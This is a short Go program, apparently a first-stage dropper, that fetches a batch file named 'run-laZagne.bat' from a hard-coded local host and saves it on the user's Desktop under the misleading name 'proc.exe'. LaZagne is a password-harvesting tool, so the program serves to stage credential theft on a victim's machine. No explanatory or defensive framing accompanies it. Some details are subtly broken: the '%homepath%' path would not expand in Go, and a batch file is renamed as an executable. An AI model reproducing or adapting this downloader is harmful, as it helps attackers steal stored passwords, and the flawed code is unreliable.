package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
)

func main() {
	var runprog string
	fmt.Println("Press any key to continue")
	fmt.Scanln(&runprog)

	baseURL := "http://192.168.1.21:8000/susdls/"
	fileURL := "run-laZagne.bat"
	dlURL := baseURL + fileURL

	fmt.Println("Fetching file: " + dlURL)
	err := DownloadFile("/%homepath%/Desktop/proc.exe", dlURL)
	if err != nil {
		fmt.Println("Encountered error downloading file...")
		fmt.Println(err)
		panic(err)
	}
	fmt.Println("Downloaded: " + fileURL)
}

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
